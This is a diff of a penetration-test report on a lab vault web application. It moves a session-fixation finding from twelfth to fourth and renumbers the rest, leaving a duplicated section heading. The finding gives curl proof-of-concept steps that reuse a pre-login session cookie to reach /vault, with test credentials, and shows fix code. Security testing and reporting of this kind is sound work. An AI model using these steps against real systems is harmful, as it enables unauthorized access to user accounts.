@@ -422,9 +422,117 @@ Response: Item deleted successfully
 
 ---
 
+## Finding 4: Broken Authentication - Session Fixation
+
+**Severity:** MEDIUM (CVSS 6.8)  
+**Points:** 25  
+**Status:** CONFIRMED
+
+### Description
+The application suffers from Session Fixation vulnerability. Old session cookies remain valid after user login, allowing attackers to maintain persistent access to user accounts.
+
+### Vulnerability Details
+- **Endpoints:** POST /login, GET /vault
+- **Issue:** Session cookies not invalidated/renewed on authentication
+- **Authentication Required:** Yes (session-based)
+
+### Proof of Concept
+
+**Step 1: Capture Pre-Login Cookie**
+```bash
+curl -I http://10.0.0.10/login
+# Extract Set-Cookie header value
+```
+
+**Step 2: Login with Valid Credentials**
+```bash
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser1","password":"csrfhacked123"}'
+```
+
+**Step 3: Access Protected Resource with Old Cookie**
+```bash
+curl http://10.0.0.10/vault \
+  -H "Cookie: connect.sid=[old_session_cookie]"
+```
+**Result:** Both old and new cookies grant access to the vault, confirming session fixation.
+
+### Impact
+- Persistent unauthorized access to user accounts
+- Session hijacking attacks
+- Account compromise without credential theft
+
+### CVSS v3.1 Score
+**Score:** 6.8 (Medium)  
+**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
+
+### Remediation
+
+1. **Invalidate Old Sessions on Login:**
+   ```javascript
+   app.post('/login', (req, res) => {
+     // ... authentication logic ...
+     
+     // Destroy old session and create new one
+     req.session.regenerate((err) => {
+       if (err) return next(err);
+       req.session.userId = user.id;
+       res.json({ success: true });
+     });
+   });
+   ```
+
+2. **Use Secure Session Management:**
+   - Set session cookie options: `secure: true`, `httpOnly: true`, `sameSite: 'strict'`
+   - Regenerate session ID after login
+
+3. **Implement Session Timeout:**
+   - Auto-expire sessions after inactivity (30 minutes)
+
+4. **Add Logout Functionality:**
+   - Properly destroy sessions on logout
+
+---
+
+#### Screenshots and Reproduction Steps
+
+**Recreation Steps:**
+1. Send GET request to /login to capture the initial session cookie (connect.sid).
+2. Login with valid credentials using the same session cookie.
+3. After login, access /vault with the old session cookie (before regeneration).
+4. Observe that both old and new cookies grant access, confirming fixation.
+
+**Screenshot 1:** Pre-login cookie capture
+
+**Screenshot 2:** Login with the same cookie
+
+**Screenshot 3:** Post-login access with old cookie still working
+
+**Command Output:**
+
+```
+# Capture pre-login cookie
+COOKIE=$(curl -I http://10.0.0.10/login 2>&1 | grep 'Set-Cookie' | awk '{print $2}' | cut -d';' -f1)
+
+# Login with the cookie
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -H "Cookie: $COOKIE" \
+  -d '{"username":"testuser","password":"password"}'
+
+# Access vault with old cookie - should still work
+curl http://10.0.0.10/vault \
+  -H "Cookie: $COOKIE"
+
+Response: Returns vault page (vulnerable)
+```
+
+---
+
 # HIGH PRIORITY FINDINGS (Reportable Vulnerabilities)
 
-## Finding 4: Cross-Site Request Forgery (CSRF) - Account Update
+## Finding 5: Cross-Site Request Forgery (CSRF) - Account Update
 
 **Severity:** MEDIUM (CVSS 6.8)  
 **Status:** CONFIRMED
@@ -521,7 +629,7 @@ The account update endpoint (`POST /account/update`) lacks CSRF protection. An a
 
 ---
 
-## Finding 5: Rate Limit Headers Present but Not Enforced - Login & Vault Unlock Endpoints
+## Finding 6: Rate Limit Headers Present but Not Enforced - Login & Vault Unlock Endpoints
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -630,7 +738,9 @@ csrfhacked123           [Status: 200, Size: 43, Words: 2, Lines: 1, Duration: 12
 
 # MEDIUM PRIORITY FINDINGS (Weaknesses)
 
-## Finding 6: Weak Password Validation
+# MEDIUM PRIORITY FINDINGS (Weaknesses)
+
+## Finding 7: Weak Password Validation
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -684,7 +794,7 @@ Response: {"success":true,"message":"Account password updated successfully!"}
 
 ---
 
-## Finding 7: Client-Side Error Handling XSS Risk
+## Finding 8: Client-Side Error Handling XSS Risk
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -731,7 +841,7 @@ curl -X POST http://10.0.0.10/login \
 
 ---
 
-## Finding 8: Missing Security Headers
+## Finding 9: Missing Security Headers
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -782,7 +892,7 @@ curl -I http://10.0.0.10
 
 ---
 
-## Finding 9: Cleartext Password Submission
+## Finding 10: Cleartext Password Submission
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -823,7 +933,7 @@ curl -X POST http://10.0.0.10/login \
 
 ---
 
-## Finding 10: Lack of Input Validation on Vault Items
+## Finding 11: Lack of Input Validation on Vault Items
 
 **Severity:** LOW  
 **Status:** CONFIRMED
@@ -865,7 +975,7 @@ curl -X POST http://10.0.0.10/vault/add \
 
 ---
 
-## Finding 11: Information Disclosure - Error Messages
+## Finding 12: Information Disclosure - Error Messages
 
 **Severity:** MEDIUM  
 **Status:** CONFIRMED
@@ -952,113 +1062,6 @@ Response: HTTP 400 with stack trace revealing /usr/app/node_modules/, Express ve
 
 ---
 
-## Finding 12: Broken Authentication - Session Fixation
-
-**Severity:** MEDIUM (CVSS 6.8)  
-**Points:** 25  
-**Status:** CONFIRMED
-
-### Description
-The application suffers from Session Fixation vulnerability. Old session cookies remain valid after user login, allowing attackers to maintain persistent access to user accounts.
-
-### Vulnerability Details
-- **Endpoints:** POST /login, GET /vault
-- **Issue:** Session cookies not invalidated/renewed on authentication
-- **Authentication Required:** Yes (session-based)
-
-### Proof of Concept
-
-**Step 1: Capture Pre-Login Cookie**
-```bash
-curl -I http://10.0.0.10/login
-# Extract Set-Cookie header value
-```
-
-**Step 2: Login with Valid Credentials**
-```bash
-curl -X POST http://10.0.0.10/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"testuser1","password":"csrfhacked123"}'
-```
-
-**Step 3: Access Protected Resource with Old Cookie**
-```bash
-curl http://10.0.0.10/vault \
-  -H "Cookie: connect.sid=[old_session_cookie]"
-```
-**Result:** Both old and new cookies grant access to the vault, confirming session fixation.
-
-### Impact
-- Persistent unauthorized access to user accounts
-- Session hijacking attacks
-- Account compromise without credential theft
-
-### CVSS v3.1 Score
-**Score:** 6.8 (Medium)  
-**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
-
-### Remediation
-
-1. **Invalidate Old Sessions on Login:**
-   ```javascript
-   app.post('/login', (req, res) => {
-     // ... authentication logic ...
-     
-     // Destroy old session and create new one
-     req.session.regenerate((err) => {
-       if (err) return next(err);
-       req.session.userId = user.id;
-       res.json({ success: true });
-     });
-   });
-   ```
-
-2. **Use Secure Session Management:**
-   - Set session cookie options: `secure: true`, `httpOnly: true`, `sameSite: 'strict'`
-   - Regenerate session ID after login
-
-3. **Implement Session Timeout:**
-   - Auto-expire sessions after inactivity (30 minutes)
-
-4. **Add Logout Functionality:**
-   - Properly destroy sessions on logout
-
----
-
-#### Screenshots and Reproduction Steps
-
-**Recreation Steps:**
-1. Send GET request to /login to capture the initial session cookie (connect.sid).
-2. Login with valid credentials using the same session cookie.
-3. After login, access /vault with the old session cookie (before regeneration).
-4. Observe that both old and new cookies grant access, confirming fixation.
-
-**Screenshot 1:** Pre-login cookie capture
-
-**Screenshot 2:** Login with the same cookie
-
-**Screenshot 3:** Post-login access with old cookie still working
-
-**Command Output:**
-
-```
-# Capture pre-login cookie
-COOKIE=$(curl -I http://10.0.0.10/login 2>&1 | grep 'Set-Cookie' | awk '{print $2}' | cut -d';' -f1)
-
-# Login with the cookie
-curl -X POST http://10.0.0.10/login \
-  -H "Content-Type: application/json" \
-  -H "Cookie: $COOKIE" \
-  -d '{"username":"testuser","password":"password"}'
-
-# Access vault with old cookie - should still work
-curl http://10.0.0.10/vault \
-  -H "Cookie: $COOKIE"
-
-Response: Returns vault page (vulnerable)
-```
-
----
 
 # Testing Coverage
 
